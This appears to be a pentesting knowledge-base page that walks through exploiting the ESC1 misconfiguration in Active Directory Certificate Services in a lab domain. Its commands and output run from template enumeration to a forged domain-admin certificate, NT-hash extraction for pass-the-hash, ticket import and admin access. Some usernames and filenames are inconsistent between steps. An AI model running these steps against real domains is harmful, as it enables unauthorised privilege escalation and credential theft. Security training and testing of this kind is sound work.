---
title: "ESC1"
# pre : ' '
description: "ESC1 - Abuse Active Directory Certificate Services."
date: 2022-01-20T09:05:59+01:00
# hidden : true
# draft : true
weight: 10
tags: ["Techniques", "Active Directory", "ADCS"]
---

---

ESC1 - Abuse Active Directory Certificate Services.

This is a little guide on abusing Active Directory Certificate Services (AD CS) with practical examples.

**PLEASE NOTE:** Check if [Certipy]({{< ref "certipy" >}}) is an option for you since this is easier to use in general.

[Cheatsheet about the different AD-CS's ESC presented by SpecterOps](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services)

### Install Certi

Please install [Certi]({{< ref "certi" >}})

### Checking vulnerable templates

You want to look at a certificate with the `msPKI-Certificate-Name-Flag: (0x1) ENROLLEE_SUPPLIES_SUBJECT` flag set. This gives the option to set an alternative name for the certificate AKA impersonating any user. Also the 'Enrollment Rights' for your current user must be available, for example `Domain Users` or the membership of your current user specifically.

**Note:** if your current user has 'Write Property' rights, it is possible to give the 'Enrollment Rights' to yourself.

```plain
$ certi.py list 'offsec.nl/johndo-lowpriv' --dc-ip DC01PKI.offsec.nl --vuln --enable
Password:
[*] Templates

Name: User
Schema Version: 1
Enroll Services: offsec-DC01PKI-CA
Vulnerabilities: ESC3.2 - Use Agent Certificate
msPKI-Certificate-Name-Flag: (0x-5a000000) SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
[...]

Name: Administrator
Schema Version: 1
Enroll Services: offsec-DC01PKI-CA
Vulnerabilities: ESC3.2 - Use Agent Certificate
msPKI-Certificate-Name-Flag: (0x-5a000000) SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
[...]

Name: Machine
Schema Version: 1
Enroll Services: offsec-DC01PKI-CA
Vulnerabilities: ESC3.2 - Use Agent Certificate
msPKI-Certificate-Name-Flag: (0x18000000) SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
[...]

Name: SubCA
Schema Version: 1
Enroll Services: offsec-DC01PKI-CA
Vulnerabilities: ESC1 - SAN Impersonation, ESC2 - Any Purpose, ESC3.2 - Use Agent Certificate
msPKI-Certificate-Name-Flag: (0x1) ENROLLEE_SUPPLIES_SUBJECT
[...]

Name: UsersOffsecAD
Schema Version: 2
Enroll Services: offsec-DC01PKI-CA
Vulnerabilities: ESC1 - SAN Impersonation
msPKI-Certificate-Name-Flag: (0x1) ENROLLEE_SUPPLIES_SUBJECT
msPKI-Enrollment-Flag: (0x9) INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
msPKI-RA-Signature: 0
pKIExtendedKeyUsage: Client Authentication
msPKI-Certificate-Application-Policy: Client Authentication
SD Owner: S-1-5-21-497837788-612300594-3587273769-500 offsec\Administrator
Permissions
  Enrollment Permissions
    Enrollment Rights
      S-1-5-21-497837788-612300594-3587273769-519 offsec\Enterprise Admins
      S-1-5-21-497837788-612300594-3587273769-512 offsec\Domain Admins
      S-1-5-21-497837788-612300594-3587273769-513 offsec\Domain Users
  Write Permissions
    Write Owner
      S-1-5-21-497837788-612300594-3587273769-519 offsec\Enterprise Admins
      S-1-5-21-497837788-612300594-3587273769-500 offsec\Administrator
      S-1-5-21-497837788-612300594-3587273769-512 offsec\Domain Admins
    Write DACL
      S-1-5-21-497837788-612300594-3587273769-519 offsec\Enterprise Admins
      S-1-5-21-497837788-612300594-3587273769-500 offsec\Administrator
      S-1-5-21-497837788-612300594-3587273769-512 offsec\Domain Admins
    Write Property
      S-1-5-21-497837788-612300594-3587273769-519 offsec\Enterprise Admins
      S-1-5-21-497837788-612300594-3587273769-500 offsec\Administrator
      S-1-5-21-497837788-612300594-3587273769-512 offsec\Domain Admins
      S-1-5-21-497837788-612300594-3587273769-513 offsec\Domain Users

15:30:21 in certi on  main took 5s
```

### Exploiting the configuration

### Getting TGT ticket

```plain
getTGT.py 'offsec.nl/johndo-lowpriv:Welkom1234'
```

Make the ticket available for the current session.

```plain
export KRB5CCNAME=johndo-lowpriv.ccache
```

### Requesting certificate with alternative name

Parameters:

- `offsec-DC01PKI-CA` - is found in the template `Enroll Services` field
- `-k` - to use kerberos authentication
- `-n` - 'no-pass' for use with `-k`
- `--alt-name` - the user you want to impersonate, this will likely be a 'Domain Admin' or equal
- `--template` - the vulnerable template name

To find the exact Certificate Authority (CA) use `certutil –config – -ping` in CMD (<https://www.cloudservus.com/blog/how-to-find-a-certificate-authority-in-your-active-directory-environment>).

```plain
$ python3 certi.py req 'offsec.nl/johndo-lowpriv@DC01PKI.offsec.nl' offsec-DC01PKI-CA -k -n --alt-name johnDomainAdmin --template UsersOffsecAD
[*] Service: offsec-DC01PKI-CA
[*] Template: UsersOffsecAD
[*] Username: johndo-lowpriv
[*] Alternative Name: johnDomainAdmin

[*] Response: 0x3 Issued

[*] Cert subject: CN=johndo-lowpriv
[*] Cert issuer: CN=offsec-DC01PKI-CA,DC=offsec,DC=local
[*] Cert Serial: 1300000820BF3CEC69D8FEB673000200000820
[*] Cert Extended Key Usage: Client Authentication
[+] Cert Altname: johnDomainAdmin@offsec.nl

[*] Saving certificate in johnDomainAdmin@offsec.nl.pfx (password: admin)
```

### Getting NTLM hash for alternative user

1. `git clone https://github.com/ly4k/Certipy`
2. `cd Certipy`
3. `python3 -m venv certipy-venv`
4. `source certipy-venv/bin/activate`
5. `pip install certipy-ad`

```plain
$ certipy auth -pfx ../certi/john-da@offsec.nl.pfx -password admin -username 'john-da' -domain 'offsec.nl' -dc-ip 10.10.10.10
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'john-da@offsec.nl'
[*] Using principal: 'john-da@offsec.nl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'john-da.ccache'
[*] Wrote credential cache to 'john-da.ccache'
[*] Trying to retrieve NT hash for 'john-da'
[*] Got hash for 'john-da@offsec.nl': aad3b435b51404eeaad3b435b51404ee:5f859684db2422704e9e4c2cd7e27b07
```

You can now use the hash (`5f859684db2422704e9e4c2cd7e27b07`) for Pass-the-Hash.

### Requesting TGT for alternative user via Windows

Move the `.pfx` to a Windows machine and start PowerShell for `Rubeus.exe`.

```plain
Z:\Rubeus.exe asktgt /domain:offsec.nl /dc:DC01PKI.offsec.nl /user:johnDomainAdmin /certificate:Z:\johnDomainAdmin@offsec.nl.pfx /password:admin /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=johndo-lowpriv
[*] Building AS-REQ (w/ PKINIT preauth) for: 'offsec.nl\johnDomainAdmin'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGPDCCBjig[REDACTED]FuZC5sb2NhbA==

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/offsec.nl
  ServiceRealm             :  offsec.nl
  UserName                 :  johnDomainAdmin
  UserRealm                :  offsec.nl
  StartTime                :  1/19/2022 6:45:25 AM
  EndTime                  :  1/19/2022 4:45:25 PM
  RenewTill                :  1/26/2022 6:45:25 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  h85ETS[REDACTED]Za+4GEw==
  ASREP (key)              :  AFC858FA[REDACTED]49D1DE
```

With `klist` you can check the requested ticket is available.

```plain
PS C:\Windows\System32\WindowsPowerShell\v1.0> klist

Current LogonId is 0:0x58f55

Cached Tickets: (1)

#0>     Client: johnDomainAdmin @ offsec.nl
        Server: krbtgt/offsec.nl @ offsec.nl
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 1/19/2022 6:45:25 (local)
        End Time:   1/19/2022 16:45:25 (local)
        Renew Time: 1/26/2022 6:45:25 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

### Verify the requested ticket is usable

```plain
PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
offsec\johndo-lowpriv

PS Z:\> dir  \\DC01PKI.offsec.nl\c$


    Directory: \\DC01PKI.offsec.nl\c$


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        12/11/2019  12:08 AM                PerfLogs
d-r---         1/11/2022   1:28 AM                Program Files
d-----         1/11/2022   1:29 AM                Program Files (x86)
d-r---         1/18/2022  12:44 AM                Users
d-----         1/19/2022   6:25 AM                Windows
```

### Convert the ticket from base to file

```plain
[IO.File]::WriteAllBytes("Z:\johnDomainAdmin.kirbi", [Convert]::FromBase64String("doIGPDCCBjig[REDACTED]FuZC5sb2NhbA=="))
```

### Convert .kirbi to .ccache

Use [ticketConverter.py]({{< ref "ticketconverter" >}}).

```plain
python3 ticket_converter.py johnDomainAdmin.kirbi johnDomainAdmin.ccache
Converting kirbi => ccache
```

Make the `.ccache` available for Kerberos authentication.

```plain
export KRB5CCNAME=admin.ccache
```

### CrackMapExec

```plain
$ cme smb DC01PKI.offsec.nl --use-kcache
SMB         DC01PKI.offsec.nl 445    DC01PKI         [*] Windows Server 2019 Standard 17763 x64 (name:DC01PKI) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         DC01PKI.offsec.nl 445    DC01PKI         [+] offsec.nl\johnDomainAdmin (Pwn3d!)
```

## URL List

- [Github.com - Certi](https://github.com/zer1t0/certi)
- [Github.com - Active Directory Attacks - Active Directory Certificate Services](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#active-directory-certificate-services)
- [Gist.github.com - Flangvik - PKI Abuse Cheatsheet](https://gist.github.com/Flangvik/15c3007dcd57b742d4ee99502440b250)
- [Ppn.snovvcrash.rocks - ADCS Abuse](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse)
- [Crowe.com - Exploiting AD CS: A quick look at ESC1 and ESC8](https://www.crowe.com/cybersecurity-watch/exploiting-ad-cs-a-quick-look-at-esc1-esc8)
- [Pentest Everything - ESC1](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adcs/esc1)
